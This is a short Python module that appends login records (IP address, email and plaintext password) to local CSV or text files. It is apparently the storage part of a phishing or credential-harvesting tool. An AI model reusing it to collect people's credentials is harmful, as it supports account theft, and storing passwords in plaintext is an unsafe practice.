def save_in_csv(login, filename="data"):
    try:
       open(filename+".csv", "a").write(f"{login.ip}, {login.email}, {login.pwd}\n")
    except Exception as err:
        print(err)
        exit(1)

def save_in_text(login, filename="data"):
    try:
        open(filename+".txt", "a").write(f"Ip:{login.ip} Email:{login.email} Password:{login.pwd}\n")
    except Exception as err:
        print(err)
        exit(1)


def autosave(res, Login):
    while True:
        if res == "csv":
            save_in_csv(Login)
            break
        elif res == "text":
            save_in_text(Login)
            break
        else:
            import logs
            logs.warn("out format not suported! using: csv")
            res = "csv"